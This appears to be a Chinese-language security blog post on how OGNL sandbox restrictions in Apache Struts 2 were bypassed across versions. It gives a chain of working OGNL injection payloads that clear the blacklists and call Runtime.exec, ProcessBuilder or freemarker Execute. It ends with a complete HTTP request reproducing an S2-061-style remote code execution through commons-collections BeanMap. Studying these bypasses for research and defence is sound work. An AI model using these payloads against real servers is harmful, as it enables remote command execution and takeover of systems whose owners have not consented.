# ognl+cc 依赖绕过沙箱

## 前言

今天晚上稍微看了一下 Struct2 攻防，然后无意间通过链接跳转，跳转，再跳转，翻到了一位外国老哥的文章，绕过可谓是淋漓尽致，整激动了，感觉能在如此沙箱下绕过，简直是神人，下面来慢慢分析

https://github.blog/security/vulnerability-research/bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY_velocity.struts2.context
https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/
## 基础知识

### Struct2

Apache Struts 2（通常简称为 Struts 2）是一个基于 Java 的开源 Web 应用框架，主要用于开发 Java EE（企业级）应用程序。它通过基于模型-视图-控制器（MVC）设计模式提供了灵活的 Web 应用开发能力。

当然现在 spring 是更胜一筹了，它已经老了，新生代开始接替了，而且我不得不说，ognl 表达式漏洞能被研究如此地步，这个前代的老人功不可没

在 Struts 2 框架中，OGNL (Object-Graph Navigation Language) 是一个非常重要的功能，它被广泛应用于表达式语言（EL）中，用于在 Struts 2 中访问和操作 Java 对象的属性。OGNL 使得 Struts 2 可以非常灵活地动态处理数据，并且与模型-视图-控制器（MVC）模式紧密集成。

### OGNL 表达式

 支持对象方法调用，如 `objName.methodName()`；
- 支持类静态方法调用和值访问，表达式的格式为`@[类全名（包括包路径）]@[方法名|值名]``，如@java.lang.String@format(‘fruit%s’,’frt’)；
- 访问OGNL上下文（OGNL context）和ActionContext；
- 可以直接new一个对象

操作符
`.`操作符：如上所示，可以调用对象的属性和方法
`@`操作符：用于调用静态对象、静态方法、静态变量
`#`操作符：定义变量,用于调用非root对象
比如
@ java.lang.Runtime@getRuntime ().exec('calc')

其中的一些重要的内置对象

attr：保存着上面三个作用域的所有属性，如果有重复的则以 request 域中的属性为基准；

VALUE_STACK：值栈，保存着 valueStack 对象，也就是说可以通过 ActionContext 访问到 valueStack 中的值；

下面的绕过会用到，因为绕过需要 content 对象，而这个对象可以从 attr 和 VALUE_STACK 中获取
## Struct2 的攻防历史

我们知道在 OGNL 使用 # 符号可以访问各种全局对象
两个重要的角色，也一直是攻击和防御的核心


`第一个是 _memberAccess，它是一个 SecurityMemberAccess 对象，用于控制 OGNL 可以做什么，另一个是 context，它允许访问更多对象，其中许多对象对漏洞利用构建很有用。`

### 静态方法调用
#### 绕过

一开始ognl 设置了一个属性，来禁用静态方法 allowStaticMethodAccess

但是可以通过如下方法
```java
#_memberAccess['allowStaticMethodAccess']=true
```
然后
```java
@java.lang.Runtime@getRuntime().exec('calc')
```
这个payload 就可以执行了

#### 修复

在 2.3.14.1 及更高版本中，allowStaticMethodAccess 变为 final，无法再更改。

### 实例化对象调用方法

不可以调用静态方法后，但是还允许构造任意类并访问其公共方法，所以其实我们根本不需要调用静态方法就可以执行命令

```java
(#p=new java.lang.ProcessBuilder('calc')).(#p.start())
```

### 黑名单

在 2.3.20 中，引入了黑名单 excludedClasses、excludedPackageNames 和 excludedPackageNamePatterns

而且禁用了构造函数的调用，不能使用静态方法

绕过点在于_memberAccess 仍然可以访问，而且 DefaultMemberAccess 对象任然允许静态方法和构造函数的调用

所以我们替换_memberAccess 来置空黑名单绕过

```java
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))
```

### 实例化 OgnlUtil

之后把类 ognl.MemberAccess 和 ognl.DefaultMemberAccess 放在了我们的黑名单中

这里使用的是实例化 OgnlUtil 对象去置空黑名单

我们的 container 中 getInstance 方法可以实例化 OgnlUtil 类

而_memberAccess 的初始化是
createActionContext 方法创建新的 ActionContext，会调用 OgnlValueStack 的 setOgnlUtil 方法，以使用 OgnlUtil 的全局实例初始化 OgnlValueStack 的 securityMemberAccess，这样置空_memberAccess 的黑名单

```java
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))
```

###  绕过clear

在之后的版本中，我们的黑名单不再可以使用clear 置空，视乎黑名单不可以再被删除

但是我们可以调用对于的setter 方法去设置一个空的黑名单

```java
(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames('')).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))
```

可惜从栈中得到的 ognlUtil 只是当前栈的

`_memberAccess 是一个瞬态对象，它是在创建新的 ActionContext 期间当请求进入时创建的。每次通过 createActionContext 方法创建新的 ActionContext 时，都会调用 setOgnlUtil 方法，以使用全局 ognlUtil 中的 excludedClasses、excludedPackageNames 等黑名单创建_memberAccess。因此，通过重新发送请求，新创建的 _memberAccess 将清空其列入黑名单的类和包，从而允许我们执行任意代码。整理了有效载荷，我以这两个有效载荷结束。第一个选项清空 excludedClasses 和 excludedPackageNames 黑名单

```java
(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
```


```java
(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))
```

## 配合cc 依赖的最后一舞

我们看看到我们的S0-61
现在已经变成什么模样了呢

- 无法 new 一个对象
- 无法调用黑名单类和包的方法、属性
- 无法使用反射
- 无法调用静态方法

黑名单

```java
public static Object invokeMethod(Object target, Method method, Object[] argsArray) throws InvocationTargetException, IllegalAccessException {        if (_useStricterInvocation) {            Class methodDeclaringClass = method.getDeclaringClass();            if (AO_SETACCESSIBLE_REF != null && AO_SETACCESSIBLE_REF.equals(method) || AO_SETACCESSIBLE_ARR_REF != null && AO_SETACCESSIBLE_ARR_REF.equals(method) || SYS_EXIT_REF != null && SYS_EXIT_REF.equals(method) || SYS_CONSOLE_REF != null && SYS_CONSOLE_REF.equals(method) || AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)) {                throw new IllegalAccessException("Method [" + method + "] cannot be called from within OGNL invokeMethod() " + "under stricter invocation mode.");            }        }
```

简直寸步难行，总结下来我们可以干的有两件事

可以访问对象的属性，调用已经实例化好对象的一些方法

两个条件连起来，那我们必须找一个属性，而这个属性本身就是一个实例化对象，而且这个实例化对象中有可以恶意利用的方法

这时候我们就需要利用ognl 表达式中的一些对象了

![img](https://gitee.com/nn0nkey/picture/raw/master/img/2.png)

`而 #application ` 中的 ` org.apache.tomcat.InstanceManager ` ，他 value 为org.apache.catalina.core.DefaultInstanceManager ` 的实例化对象，该类为tomcat中的类
看到它的方法
![](https://gitee.com/nn0nkey/picture/raw/master/img/20241215021221.png)
其中传入的参数是我们可以控制的，这样我们就可以绕过不能实例化类的限制

但是还是有个问题，黑名单中禁用了我们需要的类，如何置空黑名单是一个问题

纵观前面置空的方法

从content，attr，等等属性中获取的方法都已经被加入到了黑名单中

不过这里关键就在于有cc 依赖，因为是可以通过getter，setter 方法访问属性的

关键类就是

org.apache.commons.collections.BeanMap

它有一个setbean 方法

```java
public void setBean( Object newBean ) {
    bean = newBean;
    reinitialise();
}
```

跟进 reinitialise 方法

```java
protected void reinitialise() {
    readMethods.clear();
    writeMethods.clear();
    types.clear();
    initialise();
}
```

跟进 initialise 方法


```java
private void initialise() {
    if(getBean() == null) return;

    Class  beanClass = getBean().getClass();
    try {
        //BeanInfo beanInfo = Introspector.getBeanInfo( bean, null );
        BeanInfo beanInfo = Introspector.getBeanInfo( beanClass );
        PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors();
        if ( propertyDescriptors != null ) {
            for ( int i = 0; i < propertyDescriptors.length; i++ ) {
                PropertyDescriptor propertyDescriptor = propertyDescriptors[i];
                if ( propertyDescriptor != null ) {
                    String name = propertyDescriptor.getName();
                    Method readMethod = propertyDescriptor.getReadMethod();
                    Method writeMethod = propertyDescriptor.getWriteMethod();
                    Class aType = propertyDescriptor.getPropertyType();

                    if ( readMethod != null ) {
                        readMethods.put( name, readMethod );
                    }
                    if ( writeMethod != null ) {
                        writeMethods.put( name, writeMethod );
                    }
                    types.put( name, aType );
                }
            }
        }
    }
    catch ( IntrospectionException e ) {
        logWarn(  e );
    }
}
```

这里的逻辑就很明显了，获取类，然后再反射获取它的getter，setter 方法

可以跟进 getReadMethod

```java
public synchronized Method getReadMethod() {
    Method readMethod = this.readMethodRef.get();
    if (readMethod == null) {
        Class<?> cls = getClass0();
        if (cls == null || (readMethodName == null && !this.readMethodRef.isSet())) {
            // The read method was explicitly set to null.
            return null;
        }
        String nextMethodName = Introspector.GET_PREFIX + getBaseName();
        if (readMethodName == null) {
            Class<?> type = getPropertyType0();
            if (type == boolean.class || type == null) {
                readMethodName = Introspector.IS_PREFIX + getBaseName();
            } else {
                readMethodName = nextMethodName;
            }
        }

        // Since there can be multiple write methods but only one getter
        // method, find the getter method first so that you know what the
        // property type is.  For booleans, there can be "is" and "get"
        // methods.  If an "is" method exists, this is the official
        // reader method so look for this one first.
        readMethod = Introspector.findMethod(cls, readMethodName, 0);
        if ((readMethod == null) && !readMethodName.equals(nextMethodName)) {
            readMethodName = nextMethodName;
            readMethod = Introspector.findMethod(cls, readMethodName, 0);
        }
        try {
            setReadMethod(readMethod);
        } catch (IntrospectionException ex) {
            // fall
        }
    }
    return readMethod;
}
```

可以看到就是获取getter 方法

那我们可不可以通过getter 方法获取到content 然后去置空我们的黑名单呢？

这是当然
`com.opensymphony.xwork2.ognl.OgnlValueStack` 类中就有 getContext 方法可以返回 OgnlContext

有了 OgnlContext 我们就可以去一样的原理

获取com.opensymphony.xwork2.ognl.SecurityMemberAccess 对象，然后调用 setExcludedClasses，setExcludedPackageNames 覆盖黑名单

## 漏洞复现

**环境搭建**

这里可以直接使用p 神的环境
![](https://gitee.com/nn0nkey/picture/raw/master/img/20241215022658.png)


```java
POST /index.action HTTP/1.1
Host: 192.168.177.146:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 831

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```


![](https://gitee.com/nn0nkey/picture/raw/master/img/20241215023122.png)

简单再解释一下payload 吧

```java
%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
```
实例化对象的过程不说了，主要是 `bean.setBean( #stack ))后我们就可以通过ValueStack获取content，然后进一步从其中获取memberAccess对象，然后为了调用setter方法修改我们的黑名单，这里采用的是直接定义一个set，其中放置我们的setter方法，然后指定调用，置空了黑名单后，我们就可以调用危险的方法了，比如freemarker.template.utility.Execute的exec方法去执行命令
